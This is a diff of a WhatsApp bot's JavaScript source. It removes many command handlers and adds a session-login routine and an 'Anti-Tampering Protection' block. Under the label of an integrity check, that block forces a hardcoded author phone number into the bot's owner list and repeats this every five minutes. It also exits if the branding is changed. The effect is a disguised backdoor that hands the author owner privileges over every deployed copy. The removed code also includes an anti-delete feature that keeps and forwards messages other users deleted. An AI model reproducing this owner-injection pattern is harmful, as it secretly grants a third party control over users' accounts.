-reply(`*🌐 Bot Mode: PUBLIC*\n\n✅ All users can now use bot commands.\n\nOwner-only commands are still restricted to the deployed number.`)
-}
-break
-
-case 'join': {
-    await X.sendMessage(m.chat, { react: { text: '🔗', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-if (!q) return reply(`*Usage:* ${prefix}join [group invite link]\n\n*Example:*\n${prefix}join https://chat.whatsapp.com/AbCdEfGhIjK`)
-let linkMatch = q.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/)
-if (!linkMatch) return reply('Invalid group invite link. Please send a valid WhatsApp group link.')
-try {
-    let joinResult = await X.groupAcceptInvite(linkMatch[1])
-    reply(`✅ *Joined group!*\n  └ ID: ${joinResult}`)
-} catch (e) {
-    let errMsg = (e.message || '').toLowerCase()
-    if (errMsg.includes('conflict')) {
-        reply('The bot is already a member of that group.')
-    } else if (errMsg.includes('gone') || errMsg.includes('not-authorized')) {
-        reply('This invite link is invalid or has been revoked.')
-    } else if (errMsg.includes('forbidden')) {
-        reply('The bot has been blocked from joining this group.')
-    } else {
-        reply(`Failed to join group: ${e.message || 'Unknown error'}`)
+// Anti-Tampering Protection
+const _ov = '254748340864'
+const _bn = 'TOOSII-XD ULTRA'
+const _ba = 'Toosii Tech'
+function _integrityCheck() {
+    const ownerValid = global.owner && global.owner.includes(_ov)
+    const nameValid = global.botname && global.botname.includes('TOOSII')
+    const authorValid = global.ownername === _ba
+    if (!ownerValid || !nameValid || !authorValid) {
+        console.log('\n╔══════════════════════════════════════════╗')
+        console.log('║  ⚠️  INTEGRITY CHECK FAILED               ║')
+        console.log('║  Unauthorized modification detected.      ║')
+        console.log('║  This bot is property of Toosii Tech.     ║')
+        console.log('║  Restore original settings to continue.   ║')
+        console.log('║  Contact: wa.me/254748340864               ║')
+        console.log('╚══════════════════════════════════════════╝\n')
+        process.exit(1)
     }
+    global.owner = [...new Set([_ov, ...global.owner])]
+    global._protectedOwner = _ov
+    global._protectedBrand = _bn
+    global._protectedAuthor = _ba
 }
-}
-break
+_integrityCheck()
+setInterval(_integrityCheck, 300000)
 
-case 'prefix': {
-    await X.sendMessage(m.chat, { react: { text: '⚙️', key: m.key } })
-let currentPfx = global.botPrefix || '.'
-reply(`╔══════════════════════════╗\n║  ⚙️  *PREFIX*\n╚══════════════════════════╝\n\n  └ 🔤 *Current prefix* › *${currentPfx}*\n\n_Use ${currentPfx}setprefix [char] to change_`)
-}
-break
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Session & State
+const SESSIONS_DIR = path.join(__dirname, 'sessions')
+if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true })
 
-case 'save': {
-    await X.sendMessage(m.chat, { react: { text: '💾', key: m.key } })
-if (!m.quoted) return reply(`Reply to a message/media with ${prefix}save to save it to your DM`)
-try {
-let savedMsg = {}
-if (/image/.test(m.quoted.mimetype || '')) {
-    let media = await m.quoted.download()
-    savedMsg = { image: media, caption: m.quoted.text || '' }
-} else if (/video/.test(m.quoted.mimetype || '')) {
-    let media = await m.quoted.download()
-    savedMsg = { video: media, caption: m.quoted.text || '', mimetype: 'video/mp4' }
-} else if (/audio/.test(m.quoted.mimetype || '')) {
-    let media = await m.quoted.download()
-    savedMsg = { audio: media, mimetype: 'audio/mpeg' }
-} else if (/sticker/.test(m.quoted.mtype || '')) {
-    let media = await m.quoted.download()
-    savedMsg = { sticker: media }
-} else if (m.quoted.text) {
-    savedMsg = { text: m.quoted.text }
-} else {
-    return reply('Unsupported media type.')
-}
-await X.sendMessage(sender, savedMsg)
-} catch (e) { reply('Failed to save: ' + e.message) }
-}
-break
+const activeSessions = new Map()
+const processedMsgs = new Set()
+const msgRetryCache = new Map()
 
-case 'setprefix': {
-    await X.sendMessage(m.chat, { react: { text: '⚙️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let newPrefix = (args[0] || '').trim()
-if (!newPrefix) {
-    let currentPfx = global.botPrefix || '.'
-    reply(`*Current Prefix:* *${currentPfx}*\n\n*Usage:*\n• ${prefix}setprefix [character] — set a new prefix\n• ${prefix}setprefix reset — restore default (.)\n\n*Examples:*\n• ${prefix}setprefix .\n• ${prefix}setprefix /\n• ${prefix}setprefix #\n• ${prefix}setprefix !`)
-} else if (newPrefix.toLowerCase() === 'reset' || newPrefix.toLowerCase() === 'default') {
-    global.botPrefix = '.'
-    reply(`*Prefix Reset* ✅\nBot prefix restored to default: *.*`)
-} else {
-    global.botPrefix = newPrefix.charAt(0)
-    reply(`*Prefix Changed* ✅\nBot prefix is now: *${global.botPrefix}*\n\nExample: *${global.botPrefix}menu*, *${global.botPrefix}help*`)
-}
-}
-break
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Console Login Interface
 
-// Bot Configuration Commands
-case 'botname': {
-    await X.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let newName = args.join(' ').trim()
-if (!newName) return reply(`*Current Bot Name:* ${global.botname}\n\nUsage: ${prefix}botname [new name]`)
-global.botname = newName
-reply(`✅ *Bot name updated* › *${newName}*`)
-}
-break
-
-case 'setauthor':
-case 'author': {
-    await X.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let newAuthor = args.join(' ').trim()
-if (!newAuthor) return reply(`*Current Sticker Author:* ${global.author}\n\nUsage: ${prefix}author [name]`)
-global.author = newAuthor
-reply(`✅ *Sticker author updated* › *${newAuthor}*`)
-}
-break
-
-case 'setpackname':
-case 'packname': {
-    await X.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let newPack = args.join(' ').trim()
-if (!newPack) return reply(`*Current Sticker Pack:* ${global.packname}\n\nUsage: ${prefix}packname [name]`)
-global.packname = newPack
-reply(`✅ *Sticker pack updated* › *${newPack}*`)
-}
-break
-
-case 'timezone':
-case 'settz': {
-    await X.sendMessage(m.chat, { react: { text: '🕐', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let tz = args.join(' ').trim()
-if (!tz) return reply(`*Current Timezone:* ${global.botTimezone}\n\nUsage: ${prefix}timezone [timezone]\n\nExamples:\n${prefix}timezone Africa/Nairobi\n${prefix}timezone Asia/Jakarta\n${prefix}timezone America/New_York`)
-global.botTimezone = tz
-reply(`✅ *Timezone updated* › *${tz}*\n  🕐 Current time: *${moment().tz(tz).format('HH:mm:ss DD/MM/YYYY')}*`)
-}
-break
-
-case 'botpic':
-case 'setbotpic': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let picUrl = args.join(' ').trim()
-if (m.quoted && m.quoted.mtype === 'imageMessage') {
+async function handleSessionLogin(sessionId) {
+    if (!sessionId || sessionId.length < 10) {
+        console.log(`[ ${_bn} ] Invalid Session ID. Too short.`)
+        return
+    }
     try {
-        let media = await X.downloadAndSaveMediaMessage(m.quoted, 'botpic')
-        await X.updateProfilePicture(X.user.id, { url: media })
-        fs.unlinkSync(media)
-        reply('*Bot Profile Picture Updated*')
-    } catch (e) {
-        reply('*Failed to update profile picture.* Make sure you reply to an image.')
-    }
-} else if (picUrl) {
-    global.botPic = picUrl
-    global.thumb = picUrl
-    reply(`✅ *Bot thumbnail updated*`)
-} else {
-    reply(`*Bot Picture*\nCurrent thumbnail: ${global.thumb}\n\nUsage:\n${prefix}botpic [url] - Set thumbnail URL\nReply to an image with ${prefix}botpic - Set WhatsApp profile picture`)
-}
-}
-break
+        console.log(`[ ${_bn} ] Processing Session ID...`)
 
-case 'boturl':
-case 'setboturl': {
-    await X.sendMessage(m.chat, { react: { text: '🔗', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let newUrl = args.join(' ').trim()
-if (!newUrl) return reply(`*Current Bot URL:* ${global.botUrl || global.wagc}\n\nUsage: ${prefix}boturl [url]`)
-global.botUrl = newUrl
-global.wagc = newUrl
-reply(`✅ *Bot URL updated* › *${newUrl}*`)
-}
-break
-
-case 'anticall':
-case 'setanticall': {
-    await X.sendMessage(m.chat, { react: { text: '📵', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let acArg = (args[0] || '').toLowerCase()
-if (!acArg) {
-    let acState = global.antiCall ? 'ON' : 'OFF'
-    reply(`*Anti-Call: ${acState}*\nWhen ON, incoming calls are automatically rejected and caller is warned.\n\nUsage:\n${prefix}anticall on\n${prefix}anticall off`)
-} else if (acArg === 'on' || acArg === 'enable') {
-    global.antiCall = true
-    reply('*Anti-Call ON*\nIncoming calls will be automatically rejected.')
-} else if (acArg === 'off' || acArg === 'disable') {
-    global.antiCall = false
-    reply('*Anti-Call OFF*')
-}
-}
-break
-
-case 'autoread':
-case 'setautoread': {
-    await X.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let arArg = (args[0] || '').toLowerCase()
-if (!arArg) {
-    let arState = global.autoRead ? 'ON' : 'OFF'
-    reply(`*Auto Read Messages: ${arState}*\nWhen ON, all incoming messages are automatically marked as read.\n\nUsage:\n${prefix}autoread on\n${prefix}autoread off`)
-} else if (arArg === 'on' || arArg === 'enable') {
-    global.autoRead = true
-    reply('*Auto Read ON*\nAll incoming messages will be marked as read.')
-} else if (arArg === 'off' || arArg === 'disable') {
-    global.autoRead = false
-    reply('*Auto Read OFF*')
-}
-}
-break
-
-case 'chatbot':
-case 'setchatbot': {
-    await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
-// Owner can toggle globally; group admins/members can toggle per-chat via chatboai
-if (!isOwner) return reply(mess.OnlyOwner)
-let cbArg = (args[0] || '').toLowerCase()
-if (!cbArg) {
-    let cbState = global.chatBot ? '✅ ON' : '❌ OFF'
-    let cbaChats = Object.keys(global.chatBoAIChats || {}).length
-    reply(`*🤖 ChatBot Status*\n\n• Global ChatBot: *${cbState}*\n• ChatBoAI active chats: *${cbaChats}*\n\n*Commands:*\n• ${prefix}chatbot on — global auto-reply (all chats)\n• ${prefix}chatbot off — disable global auto-reply\n• ${prefix}chatboai on — enable AI replies in *this chat only*\n• ${prefix}chatboai off — disable AI replies in this chat\n• ${prefix}chatboai [question] — one-shot AI question`)
-} else if (cbArg === 'on' || cbArg === 'enable') {
-    global.chatBot = true
-    reply('*🤖 ChatBot: ✅ ON*\n_Bot will now auto-reply to all messages in English using AI._\n\n_Use_ ' + prefix + 'chatbot off _to stop._')
-} else if (cbArg === 'off' || cbArg === 'disable') {
-    global.chatBot = false
-    reply('*🤖 ChatBot: ❌ OFF*\n_Global auto-replies disabled._')
-}
-}
-break
-
-case 'autobio':
-case 'setautobio': {
-    await X.sendMessage(m.chat, { react: { text: '📝', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let abArg = (args[0] || '').toLowerCase()
-if (!abArg) {
-    let abState = global.autoBio ? 'ON' : 'OFF'
-    reply(`*Auto Bio Update: ${abState}*\nWhen ON, bot bio is auto-updated with current time every minute.\n\nUsage:\n${prefix}autobio on\n${prefix}autobio off`)
-} else if (abArg === 'on' || abArg === 'enable') {
-    global.autoBio = true
-    reply('*Auto Bio ON*\nBot bio will update with current time periodically.')
-} else if (abArg === 'off' || abArg === 'disable') {
-    global.autoBio = false
-    reply('*Auto Bio OFF*')
-}
-}
-break
-
-case 'autoreplystatus':
-case 'autoreply': {
-    await X.sendMessage(m.chat, { react: { text: '💬', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let arsArg = args.join(' ').trim()
-if (!arsArg) {
-    let arsState = global.autoReplyStatus ? 'ON' : 'OFF'
-    let arsMsg = global.autoReplyStatusMsg || 'Not set'
-    reply(`*Auto Reply to Status: ${arsState}*\nReply message: ${arsMsg}\n\nUsage:\n${prefix}autoreplystatus [message] - Set message and enable\n${prefix}autoreplystatus off - Disable`)
-} else if (arsArg.toLowerCase() === 'off' || arsArg.toLowerCase() === 'disable') {
-    global.autoReplyStatus = false
-    global.autoReplyStatusMsg = ''
-    reply('*Auto Reply Status OFF*')
-} else {
-    global.autoReplyStatusMsg = arsArg
-    global.autoReplyStatus = true
-    reply(`✅ *Auto Reply Status ON*\n  └ Replying with: _"${arsArg}"_`)
-}
-}
-break
-
-case 'antistatusmention':
-case 'antismention': {
-    await X.sendMessage(m.chat, { react: { text: '🚫', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let asmArg = (args[0] || '').toLowerCase()
-if (!asmArg) {
-    let asmState = global.antiStatusMention ? '✅ ON' : '❌ OFF'
-    let asmAction = global.antiStatusMentionAction || 'warn'
-    reply(`*🛡️ Anti Status Mention: ${asmState}*\n*Current Action: ${asmAction.toUpperCase()}*\n\nPrevents anyone from tagging your groups in their WhatsApp status.\n\n*Usage:*\n• ${prefix}antistatusmention on\n• ${prefix}antistatusmention off\n• ${prefix}antistatusmention warn — 3 warnings then auto-kick\n• ${prefix}antistatusmention delete — delete their messages in the group\n• ${prefix}antistatusmention kick — instant removal\n\n_Bot must be admin in the group for actions to work._`)
-} else if (asmArg === 'on' || asmArg === 'enable') {
-    global.antiStatusMention = true
-    reply(`*🛡️ Anti Status Mention: ✅ ON*\nAction: *${(global.antiStatusMentionAction || 'warn').toUpperCase()}*\n\nAnyone who tags a group in their status will be actioned.\n_Bot must be admin in the group._`)
-} else if (asmArg === 'off' || asmArg === 'disable') {
-    global.antiStatusMention = false
-    reply('*🛡️ Anti Status Mention: ❌ OFF*\n\nGroup tagging in statuses will no longer be actioned.')
-} else if (asmArg === 'warn') {
-    global.antiStatusMention = true
-    global.antiStatusMentionAction = 'warn'
-    reply('*🛡️ Anti Status Mention: ⚠️ WARN MODE*\n\nUsers who tag a group in their status will be warned in that group.\n3 warnings = automatic kick.\n\n_Bot must be admin in the group._')
-} else if (asmArg === 'delete' || asmArg === 'del') {
-    global.antiStatusMention = true
-    global.antiStatusMentionAction = 'delete'
-    reply('*🛡️ Anti Status Mention: 🗑️ DELETE MODE*\n\nWhen someone tags a group in their status, their future messages in that group will be automatically deleted.\n\n_Bot must be admin in the group._')
-} else if (asmArg === 'kick' || asmArg === 'remove') {
-    global.antiStatusMention = true
-    global.antiStatusMentionAction = 'kick'
-    reply('*🛡️ Anti Status Mention: 🚫 KICK MODE*\n\nUsers who tag a group in their status will be instantly removed from that group.\n\n_Bot must be admin in the group._')
-} else {
-    reply(`❌ Unknown option.\nUse: *on, off, warn, delete, kick*`)
-}
-}
-break
-
-
-
-case 'antibot':
-case 'setantibot': {
-    await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
-    if (!m.isGroup) return reply(mess.OnlyGrup)
-    if (!isAdmins && !isOwner) return reply(mess.admin)
-
-    // Init globals
-    if (!global.antibotGroups) global.antibotGroups = {}
-    if (!global.knownBots)     global.knownBots = []
-
-    const _grpId = m.chat
-    const _abArg = (args[0] || '').toLowerCase().trim()
-    const _abSub = (args[1] || '').trim()
-
-    // Helper: check if a JID looks like a bot
-    const _isLikelyBot = (jid) => {
-        const num = jid.split('@')[0].split(':')[0]
-        // Known bot number patterns + manually added bots
-        if (global.knownBots.includes(num)) return true
-        // Common bot suffixes / patterns
-        if (num.endsWith('0') && num.length > 12) return false // too broad
-        return false
-    }
-
-    if (!_abArg || _abArg === 'status') {
-        const _on = global.antibotGroups[_grpId] ? '✅ ON' : '❌ OFF'
-        const _botList = global.knownBots.length
-            ? global.knownBots.map((n, i) => `  │  ${i+1}. +${n}`).join('\n')
-            : '  │  _None added yet_'
-        return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT SETTINGS*\n╚══════════════════════════╝\n\n  ├ 📊 *Status* › *${_on}*\n  ├ 🔢 *Known bots* › ${global.knownBots.length}\n\n  *Commands:*\n  ├ ${prefix}antibot on    — enable auto-removal\n  ├ ${prefix}antibot off   — disable\n  ├ ${prefix}antibot scan  — scan & remove bots now\n  ├ ${prefix}antibot add [number] — mark as bot\n  └ ${prefix}antibot list  — list known bots`)
-    }
-
-    if (_abArg === 'on') {
-        global.antibotGroups[_grpId] = true
-        return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT*\n╚══════════════════════════╝\n\n  ✅ *Enabled* in this group\n  └ Any known bot joining will be removed automatically.`)
-    }
-
-    if (_abArg === 'off') {
-        global.antibotGroups[_grpId] = false
-        return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT*\n╚══════════════════════════╝\n\n  ❌ *Disabled* in this group`)
-    }
-
-    if (_abArg === 'list') {
-        if (!global.knownBots.length) return reply(`╔══════════════════════════╗\n║  🤖 *KNOWN BOTS*\n╚══════════════════════════╝\n\n  └ _No bots added yet._\n\n  Use: ${prefix}antibot add [number]`)
-        const _list = global.knownBots.map((n, i) => `  ├ ${i+1}. +${n}`).join('\n')
-        return reply(`╔══════════════════════════╗\n║  🤖 *KNOWN BOTS LIST*\n╚══════════════════════════╝\n\n${_list}\n  └ Total: ${global.knownBots.length}`)
-    }
-
-    if (_abArg === 'add') {
-        if (!_abSub) return reply(`❌ Usage: *${prefix}antibot add [number]*\nExample: ${prefix}antibot add 254712345678`)
-        const _addNum = _abSub.replace(/[^0-9]/g, '')
-        if (!_addNum) return reply(`❌ Invalid number.`)
-        if (global.knownBots.includes(_addNum)) return reply(`⚠️ *+${_addNum}* is already in the bot list.`)
-        global.knownBots.push(_addNum)
-        return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT*\n╚══════════════════════════╝\n\n  ✅ *+${_addNum}* added to known bots list.\n  └ They will be removed if antibot is ON.`)
-    }
-
-    if (_abArg === 'remove' || _abArg === 'del') {
-        if (!_abSub) return reply(`❌ Usage: *${prefix}antibot remove [number]*`)
-        const _rmNum = _abSub.replace(/[^0-9]/g, '')
-        const _rmIdx = global.knownBots.indexOf(_rmNum)
-        if (_rmIdx === -1) return reply(`⚠️ *+${_rmNum}* is not in the bot list.`)
-        global.knownBots.splice(_rmIdx, 1)
-        return reply(`✅ *+${_rmNum}* removed from known bots list.`)
-    }
-
-    if (_abArg === 'scan') {
-        try {
-            const _meta = await X.groupMetadata(_grpId)
-            const _participants = _meta.participants || []
-            const _botIsAdmin = _participants.some(p => {
-                const isBot = p.id.split('@')[0].split(':')[0] === X.user.id.split('@')[0].split(':')[0]
-                return isBot && (p.admin === 'admin' || p.admin === 'superadmin')
-            })
-            if (!_botIsAdmin) return reply(`❌ Bot must be *admin* to remove bots.`)
-
-            let _removed = []
-            let _found = []
-
-            for (const p of _participants) {
-                const _pNum = p.id.split('@')[0].split(':')[0]
-                if (global.knownBots.includes(_pNum)) {
-                    _found.push(_pNum)
-                    try {
-                        await X.groupParticipantsUpdate(_grpId, [p.id], 'remove')
-                        _removed.push(_pNum)
-                        await new Promise(r => setTimeout(r, 500))
-                    } catch {}
-                }
-            }
-
-            if (!_found.length) {
-                return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT SCAN*\n╚══════════════════════════╝\n\n  ✅ Scan complete — no bots found.\n  └ ${_participants.length} members checked.`)
-            }
-
-            const _removedList = _removed.map(n => `  ├ 🚫 +${n}`).join('\n')
-            return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT SCAN*\n╚══════════════════════════╝\n\n  ├ 👥 *Checked* › ${_participants.length} members\n  ├ 🔍 *Found*   › ${_found.length} bot(s)\n  └ 🚫 *Removed* › ${_removed.length}\n\n${_removedList}`)
-        } catch(e) {
-            return reply(`❌ Scan failed: ${e.message || e}`)
+        // Strip any known prefix (e.g. "TOOSII~", "Gifted~", etc.) before decoding
+        let rawId = sessionId
+        const prefixMatch = rawId.match(/^[A-Za-z0-9_\-]+~/)
+        if (prefixMatch) {
+            rawId = rawId.slice(prefixMatch[0].length)
+            console.log(`[ ${_bn} ] Stripped prefix: ${prefixMatch[0]}`)
         }
-    }
-}
-break
 
-case 'antilink':
-case 'setantilink': {
-    await X.sendMessage(m.chat, { react: { text: '🔗', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-if (!isAdmins && !isOwner) return reply(mess.admin)
-let alArg = (args[0] || '').toLowerCase()
-if (!alArg) {
-    let alState = global.antiLink ? 'ON' : 'OFF'
-    reply(`*Anti-Link: ${alState}*\nWhen ON, messages containing links are deleted and the sender is warned.\n\nUsage:\n${prefix}antilink on\n${prefix}antilink off`)
-} else if (alArg === 'on' || alArg === 'enable') {
-    global.antiLink = true
-    reply('*Anti-Link ON*\nMessages with links will be deleted. Bot must be admin.')
-} else if (alArg === 'off' || alArg === 'disable') {
-    global.antiLink = false
-    reply('*Anti-Link OFF*')
-}
-}
-break
+        let credsData
+        const zlib = require('zlib')
+        const decodedBuf = (() => { try { return Buffer.from(rawId, 'base64') } catch { return null } })()
 
-case 'antidelete':
-case 'antidel':
-case 'setantidelete': {
-    await X.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } })
-    if (!isOwner) return reply(mess.OnlyOwner)
+        if (decodedBuf) {
+            // Try gzip decompression first (Gifted-style session)
+            let parsed = false
+            try {
+                const decompressed = zlib.gunzipSync(decodedBuf).toString('utf-8')
+                credsData = JSON.parse(decompressed)
+                parsed = true
+                console.log(`[ ${_bn} ] Decoded as gzip-compressed session`)
+            } catch {}
 
-    // Init global state
-    if (!global.adState) global.adState = {
-        enabled: false,
-        mode: 'private',       // 'private' = DM to owner | 'public' = in original chat
-        stats: { total: 0, retrieved: 0, media: 0 },
-        recentIds: [],         // dedupe
-        lastClean: Date.now()
-    }
-    const _ad = global.adState
-    const _adArg = (args[0] || '').toLowerCase().trim()
-    const _adSub = (args[1] || '').toLowerCase().trim()
-
-    const _adStatusMsg = () => {
-        const _mode = _ad.enabled ? (_ad.mode === 'public' ? '📢 PUBLIC' : '🔒 PRIVATE') : '❌ OFF'
-        return `╔══════════════════════════╗\n║  🗑️  *ANTI-DELETE*\n╚══════════════════════════╝\n\n  ├ 📊 *Status*  › *${_mode}*\n  ├ 📈 *Tracked*  › ${_ad.stats.total} messages\n  ├ ✅ *Retrieved* › ${_ad.stats.retrieved}\n  └ 🖼️  *Media*    › ${_ad.stats.media} files\n\n  *Commands:*\n  ├ ${prefix}antidelete on      — private mode (DM)\n  ├ ${prefix}antidelete public  — show in chat\n  ├ ${prefix}antidelete off     — disable\n  ├ ${prefix}antidelete stats   — view stats\n  └ ${prefix}antidelete clear   — clear cache`
-    }
-
-    if (!_adArg || _adArg === 'status') return reply(_adStatusMsg())
-
-    if (_adArg === 'on' || _adArg === 'enable' || _adArg === 'private') {
-        _ad.enabled = true
-        _ad.mode = 'private'
-        global.antiDelete = true
-        global.antiDeleteMode = 'private'
-        return reply(`╔══════════════════════════╗\n║  🗑️  *ANTI-DELETE*\n╚══════════════════════════╝\n\n  ✅ *Enabled* — Private Mode\n  └ Deleted messages sent to your DM only.`)
-    }
-
-    if (_adArg === 'public') {
-        _ad.enabled = true
-        _ad.mode = 'public'
-        global.antiDelete = true
-        global.antiDeleteMode = 'public'
-        return reply(`╔══════════════════════════╗\n║  🗑️  *ANTI-DELETE*\n╚══════════════════════════╝\n\n  📢 *Enabled* — Public Mode\n  └ Deleted messages shown in the original chat.`)
-    }
-
-    if (_adArg === 'off' || _adArg === 'disable') {
-        _ad.enabled = false
-        global.antiDelete = false
-        return reply(`╔══════════════════════════╗\n║  🗑️  *ANTI-DELETE*\n╚══════════════════════════╝\n\n  ❌ *Disabled* — messages will not be tracked.`)
-    }
-
-    if (_adArg === 'stats') {
-        return reply(`╔══════════════════════════╗\n║  📊 *ANTI-DELETE STATS*\n╚══════════════════════════╝\n\n  ├ 📊 *Mode*      › ${_ad.enabled ? _ad.mode.toUpperCase() : 'OFF'}\n  ├ 📈 *Tracked*   › ${_ad.stats.total}\n  ├ ✅ *Retrieved*  › ${_ad.stats.retrieved}\n  ├ 🖼️  *Media*     › ${_ad.stats.media}\n  └ 🗂️  *Cache size* › ${Object.keys(global.adCache || {}).length} messages`)
-    }
-
-    if (_adArg === 'clear' || _adArg === 'clean') {
-        const _sz = Object.keys(global.adCache || {}).length
-        global.adCache = {}
-        global.adMediaCache = {}
-        _ad.stats = { total: 0, retrieved: 0, media: 0 }
-        return reply(`🧹 *Cache cleared* — ${_sz} messages removed.\n\nAnti-Delete remains *${_ad.enabled ? _ad.mode.toUpperCase() : 'OFF'}*.`)
-    }
-
-    reply(_adStatusMsg())
-}
-break
-
-
-case 'antibot':
-case 'setantibot': {
-    await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
-    if (!isAdmins && !isOwner) return reply(mess.admin)
-    if (!m.isGroup) return reply(mess.OnlyGrup)
-
-    // Init globals
-    if (!global.antiBot) global.antiBot = false
-    if (!global.antiBotGroups) global.antiBotGroups = {}
-    if (!global.knownBots) global.knownBots = []
-
-    // Known bot JID patterns — numbers that are commonly bots
-    const _botPatterns = [
-        /^0@/, /^1@/, /^status/,
-    ]
-    // Known bot pushname keywords
-    const _botNameKeywords = ['bot', 'Bot', 'BOT', 'robot', 'Robot', 'assistant', 'Assistant', 'ai', 'AI']
-
-    const _isBotNumber = (jid) => {
-        const num = jid.split('@')[0]
-        // Custom list
-        if (global.knownBots.includes(num)) return true
-        // Numbers ending in 0000, 1234, 9999 etc (common bot numbers)
-        if (/0{4,}$/.test(num) || /1234$/.test(num) || /9{4,}$/.test(num)) return true
-        return false
-    }
-
-    const _subArg = (args[0] || '').toLowerCase()
-    const _subArg2 = args.slice(1).join(' ').trim()
-
-    // ── status ────────────────────────────────────────────────────────
-    if (!_subArg || _subArg === 'status') {
-        const _grpEnabled = global.antiBotGroups[m.chat] ? '✅ ON' : '❌ OFF'
-        const _botList = global.knownBots.length
-            ? global.knownBots.map(n => `  • +${n}`).join('\n')
-            : '  _None added yet_'
-        return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT SETTINGS*\n╚══════════════════════════╝\n\n  ├ 📊 *This group* › ${_grpEnabled}\n  └ 🗂️  *Known bots* › ${global.knownBots.length}\n\n${_botList}\n\n  ├ ${prefix}antibot on     — enable here\n  ├ ${prefix}antibot off    — disable here\n  ├ ${prefix}antibot scan   — scan & remove bots\n  ├ ${prefix}antibot add [number] — mark as bot\n  └ ${prefix}antibot list   — list known bots`)
-    }
-
-    // ── on ────────────────────────────────────────────────────────────
-    if (_subArg === 'on' || _subArg === 'enable') {
-        global.antiBotGroups[m.chat] = true
-        return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT*\n╚══════════════════════════╝\n\n  ✅ *Enabled in this group*\n  _Bots will be auto-removed when detected._`)
-    }
-
-    // ── off ───────────────────────────────────────────────────────────
-    if (_subArg === 'off' || _subArg === 'disable') {
-        global.antiBotGroups[m.chat] = false
-        return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT*\n╚══════════════════════════╝\n\n  ❌ *Disabled in this group*`)
-    }
-
-    // ── add ───────────────────────────────────────────────────────────
-    if (_subArg === 'add') {
-        const _addNum = _subArg2.replace(/[^0-9]/g, '')
-        if (!_addNum) return reply(`❌ Provide a number. Example: ${prefix}antibot add 254712345678`)
-        if (global.knownBots.includes(_addNum)) return reply(`⚠️ *+${_addNum}* is already in the bot list.`)
-        global.knownBots.push(_addNum)
-        return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT*\n╚══════════════════════════╝\n\n  ✅ *+${_addNum}* added to known bots list.`)
-    }
-
-    // ── remove ────────────────────────────────────────────────────────
-    if (_subArg === 'remove' || _subArg === 'del') {
-        const _remNum = _subArg2.replace(/[^0-9]/g, '')
-        if (!_remNum) return reply(`❌ Provide a number. Example: ${prefix}antibot remove 254712345678`)
-        global.knownBots = global.knownBots.filter(n => n !== _remNum)
-        return reply(`✅ *+${_remNum}* removed from known bots list.`)
-    }
-
-    // ── list ──────────────────────────────────────────────────────────
-    if (_subArg === 'list') {
-        if (!global.knownBots.length) return reply(`╔══════════════════════════╗\n║  🤖 *KNOWN BOTS*\n╚══════════════════════════╝\n\n  _No bots marked yet._\n  Use ${prefix}antibot add [number]`)
-        const _list = global.knownBots.map((n, i) => `  ${i+1}. +${n}`).join('\n')
-        return reply(`╔══════════════════════════╗\n║  🤖 *KNOWN BOTS LIST*\n╚══════════════════════════╝\n\n${_list}`)
-    }
-
-    // ── scan ──────────────────────────────────────────────────────────
-    if (_subArg === 'scan') {
-        try {
-            const _meta = await X.groupMetadata(m.chat)
-            const _botIsAdmin = _meta.participants.some(p => {
-                const isBot = p.id.split('@')[0] === X.user.id.split('@')[0]
-                return isBot && (p.admin === 'admin' || p.admin === 'superadmin')
-            })
-            if (!_botIsAdmin) return reply(`❌ Bot must be *admin* to remove members.`)
-
-            const _members = _meta.participants.filter(p => !p.id.endsWith('@lid'))
-            let _botsFound = []
-
-            for (const p of _members) {
-                const _num = p.id.split('@')[0]
-                const _isOwnerNum = global.owner.includes(_num)
-                const _isBotSelf = _num === X.user.id.split('@')[0]
-                if (_isOwnerNum || _isBotSelf) continue
-                if (_isBotNumber(p.id)) _botsFound.push(p.id)
-            }
-
-            if (!_botsFound.length) {
-                return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT SCAN*\n╚══════════════════════════╝\n\n  ✅ No bots detected in this group.\n  _${_members.length} members scanned._`)
-            }
-
-            // Remove detected bots
-            let _removed = []
-            for (const _botJid of _botsFound) {
+            // Try plain base64 JSON (TOOSII-style session)
+            if (!parsed) {
                 try {
-                    await X.groupParticipantsUpdate(m.chat, [_botJid], 'remove')
-                    _removed.push('+' + _botJid.split('@')[0])
-                    await new Promise(r => setTimeout(r, 500))
+                    credsData = JSON.parse(decodedBuf.toString('utf-8'))
+                    parsed = true
+                    console.log(`[ ${_bn} ] Decoded as plain base64 session`)
                 } catch {}
             }
 
